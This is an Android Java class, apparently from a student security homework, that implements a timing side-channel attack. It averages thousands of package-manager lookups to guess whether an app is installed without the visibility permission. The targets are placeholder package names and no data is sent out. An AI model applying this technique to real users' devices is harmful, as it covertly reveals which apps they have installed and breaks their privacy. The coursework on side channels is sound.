package nordberg.katie.hw7sidechannels;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.PowerManager;
import android.util.Log;

import java.util.List;

public class SpyThread extends Thread {
    private final Activity activity;

    public SpyThread(Activity context) {
        this.activity = context;
    }

    private long timeRequest(){
        return 0;
    }

//    This function was used in class to show that all app targets will be returned as false (meaning they are not installed)
//    if the wrong permissions are used. This function is not actually used for the side channel attack.
    private void usePMchecks(String target) {
        PackageManager pkgMan = activity.getPackageManager();
        List<ApplicationInfo> packages = pkgMan.getInstalledApplications(0);
        try {
            activity.getPackageManager().getPackageInfo(target, PackageManager.GET_ACTIVITIES);
            Log.e("PKG_NAME", "Found " + target);
        } catch (PackageManager.NameNotFoundException ex) {
            Log.e("PKG_NAME", "Not Found " + target);
        }
    }

    public long timing(String target, int numIterations) {
        long diffTotal = 0;

        for (int i = 0; i < numIterations; i++){
            long tPre = System.nanoTime();
            try {
                activity.getPackageManager().getApplicationInfo(target, 0);
            }
            catch (PackageManager.NameNotFoundException ex){}
            long tPost = System.nanoTime();
            diffTotal += tPost - tPre;
        }

        long averagedDiff = diffTotal / numIterations;
        return averagedDiff;
    }

    public void run() {
        AlertDialog.Builder adb = new AlertDialog.Builder(activity);

        long presentDiff = timing("com.example.buttoncrasher", 10000);
        long absentDiff = timing("com.example.isnotpresent", 10000);
        long targetDiff = timing( "com.example.maybepresent", 10000);

        Log.d("BENIGN", "Absent: " + absentDiff + "   Present: " + presentDiff + "   Maybe: " + targetDiff);

        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (absentDiff - targetDiff < presentDiff - targetDiff) {
                    adb.setMessage("It's likely the package is not installed").show();
                } else {
                    adb.setMessage("It's likely the package is installed").show();
                }
            }
        });
    }
}
